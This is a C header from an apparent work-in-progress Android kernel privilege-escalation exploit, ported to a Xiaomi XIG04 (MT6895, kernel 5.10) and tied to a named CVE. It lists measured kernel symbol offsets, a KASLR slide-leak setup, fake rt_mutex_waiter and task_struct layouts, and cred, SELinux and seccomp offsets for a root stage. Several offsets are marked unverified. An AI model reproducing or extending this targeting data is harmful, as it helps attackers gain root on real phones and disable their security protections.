#ifndef TARGET_H
#define TARGET_H

/* aristotle — au/KDDI Xiaomi XIG04, MT6895 (Dimensity 8100), Android 12,
 * kernel 5.10.136-android12-9. Base rebranded from Colorful-glassblock/duchamp-root.
 *
 * STATUS (2026-07-24): symbol addresses + base constants + task_struct offsets
 * below are MEASURED for aristotle 5.10 (kallsyms from
 * lks/aristotle/aristotle_XIG04_images_.../images/boot.img via
 * ../../../CVE-2026-43499-aristotle/scratchpad/symdump.py; struct offsets from
 * the measured CVE-2026-43499-aristotle port). Still WIP — see the WARN blocks:
 *   1. rt_mutex_waiter is 5.10 FLAT (10 words, NO wake_state/ww_ctx) — the
 *      duchamp slide.c overlay is written for the 6.1 nested layout and must be
 *      re-derived so rb_erase takes a ROTATION path (SLIDE_LEAK_DISASM_ANALYSIS.md).
 *   2. configfs_read_iter / configfs_bin_write_iter / copy_splice_read do NOT
 *      exist on 5.10 (they are 6.x); 5.10 has configfs_read_file /
 *      configfs_bin_file_operations / generic_file_splice_read. The fops-swap
 *      root stage must be adapted.
 *   3. pipe/fops/cred/struct_page offsets are still inherited from duchamp (6.1)
 *      and need verification against 5.10 BTF.
 */
#define BUILD_VARIANT_LABEL "aristotle_V14.0.3.0.TMFJPKD_12.0"
#define BUILD_FINGERPRINT "Xiaomi/XIG04_jp_kdi/XIG04:12/SP1A.210812.016/V14.0.3.0.TMFJPKD:user/release-keys"

/* --- base constants (MEASURED, aristotle 5.10; VA=39bit) --- */
#define KIMAGE_TEXT_BASE 0xffffffc010000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL      /* delta 0: kernel at memstart */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL    /* WARN: verify for 39-bit VA */

/* WARN: aristotle 5.10 frame delta measured 0 (pselect6/core_sys_select/futex
 * frames). duchamp's 6.1 value was 1. The slide overlay word table must also
 * move to the 5.10 flat layout (see block 1 above). */
#define PSELECT_WAITER_WORD_SHIFT 0

/* --- kernel image symbol RVAs (MEASURED, aristotle 5.10 kallsyms) --- */
#define ASHMEM_MISC_FOPS_OFF 0x0229d120ULL     /* WARN: distinct ashmem_misc fops not resolved; using ashmem_fops */
#define ASHMEM_FOPS_OFF 0x0229d120ULL          /* ashmem_fops */
#define ASHMEM_IOCTL_OFF 0x011a37d8ULL         /* ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF 0x011a4328ULL  /* compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF 0x011a4388ULL          /* ashmem_mmap */
#define ASHMEM_OPEN_OFF 0x011a45d0ULL          /* ashmem_open */
#define ASHMEM_RELEASE_OFF 0x011a4670ULL       /* ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF 0x011a4794ULL   /* ashmem_show_fdinfo */
#define CONFIGFS_READ_ITER_OFF 0x006b4794ULL   /* WARN: 5.10 has NO configfs_read_iter; this is configfs_read_file — root stage must adapt */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x02157220ULL /* WARN: 5.10 has NO configfs_bin_write_iter; this is configfs_bin_file_operations — root stage must adapt */
#define COPY_SPLICE_READ_OFF 0x005c18a4ULL     /* WARN: 5.10 has NO copy_splice_read; using generic_file_splice_read */
#define NOOP_LLSEEK_OFF 0x0054684cULL          /* noop_llseek */
#define INIT_TASK_OFF 0x0277bf80ULL            /* init_task */
#define INIT_UTS_NS_OFF 0x0277bd28ULL          /* init_uts_ns */
#define EMPTY_ZERO_PAGE_OFF 0x02971000ULL      /* empty_zero_page */
#define ROOT_TASK_GROUP_OFF 0x02976040ULL      /* root_task_group */
#define SELINUX_BLOB_SIZES_OFF 0x022df670ULL   /* selinux_blob_sizes */
#define SELINUX_ENFORCING_OFF 0x02a25b90ULL    /* selinux_state (enforcing @ +0) */
#define SECURITY_HOOK_HEADS_OFF 0x022defe0ULL  /* security_hook_heads */
#define KMALLOC_CACHES_OFF 0x022deb18ULL       /* kmalloc_caches */
#define ANON_PIPE_BUF_OPS_OFF 0x0214c128ULL    /* anon_pipe_buf_ops */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* --- slide-leak anchors (MEASURED, aristotle 5.10) --- */
#define SLIDE_NFULNL_LOGGER_OFF 0x02771450ULL      /* nfulnl_logger */
#define SLIDE_LOGGERS_0_1_OFF 0x02771380ULL        /* &loggers[0][1] = loggers(0x2771378)+8 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02886cf8ULL /* boot_id ctl_table.data = random_table(0x2886bf0)+0x108 */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02886cf8ULL      /* = boot_id data (duchamp keeps these equal) */

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* --- exploit fake-page layout (internal choices; kept from base) --- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* --- rt_mutex_waiter: 5.10 FLAT layout (MEASURED) ---
 * WARN: NO wake_state/ww_ctx on 5.10. The two *_WAKE_STATE/*_WW_CTX defs below
 * are past-end placeholders so the (still 6.1-nested) shared slide.c keeps
 * compiling; remove them when slide.c is ported to the flat layout. */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WAKE_STATE_OFF 0x50   /* WARN: 5.10-absent (past struct end) */
#define WAITER_WW_CTX_OFF 0x58       /* WARN: 5.10-absent (past struct end) */

/* WARN: fake-waiter slide overlay — still the 6.1 NESTED mapping. Must be rebuilt
 * for the 5.10 flat waiter to induce a rb_erase ROTATION (SLIDE_LEAK_DISASM_ANALYSIS.md). */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x50  /* WARN: 5.10-absent */
#define FAKE_WAITER_WW_CTX_OFF 0x58      /* WARN: 5.10-absent */

/* --- task_struct offsets (MEASURED, aristotle 5.10) --- */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

/* WARN: configfs_config offsets — verify vs 5.10 (kept from duchamp 6.1) */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* task_struct extra offsets — real_cred/cred MEASURED for aristotle; the rest are
 * WARN: still duchamp 6.1 values (pid/tgid/comm/... differ on 5.10 — verify vs BTF). */
#define MM_OWNER_OFF 1032
#define TASK_PID_OFF 0x618           /* WARN: verify */
#define TASK_TGID_OFF 0x61c          /* WARN: verify */
#define TASK_REAL_PARENT_OFF 0x628   /* WARN: verify */
#define TASK_ATOMIC_FLAGS_OFF 0x5d8  /* WARN: verify */
#define TASK_REAL_CRED_OFF 0x778     /* MEASURED */
#define TASK_CRED_OFF 0x780          /* MEASURED */
#define TASK_COMM_OFF 0x830          /* WARN: verify */
#define TASK_TASKS_OFF 0x550         /* WARN: verify */
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8       /* WARN: verify */

/* WARN: cred / seccomp / struct_page / pipe / file_operations offsets — kept from
 * duchamp 6.1; many are version-stable but verify vs 5.10 BTF before relying on
 * the root stage. */
#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc0
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
